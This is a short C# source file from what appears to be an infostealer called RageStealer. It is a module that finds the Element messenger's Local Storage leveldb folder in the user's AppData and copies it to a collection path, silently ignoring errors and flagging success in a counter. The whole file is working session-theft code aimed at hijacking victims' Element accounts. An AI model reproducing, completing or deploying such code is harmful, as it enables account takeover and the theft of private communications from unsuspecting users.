using System.IO;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Messengers;

internal sealed class Element
{
	private static readonly string ElementPath = Path.Combine(Paths.Appdata, "Element\\Local Storage");

	public static void GetSession(string sSavePath)
	{
		if (!Directory.Exists(ElementPath))
		{
			return;
		}
		string text = Path.Combine(ElementPath, "leveldb");
		if (!Directory.Exists(text))
		{
			return;
		}
		try
		{
			Filemanager.CopyDirectory(text, sSavePath + "\\leveldb");
			Counter.Element = true;
		}
		catch
		{
		}
	}
}
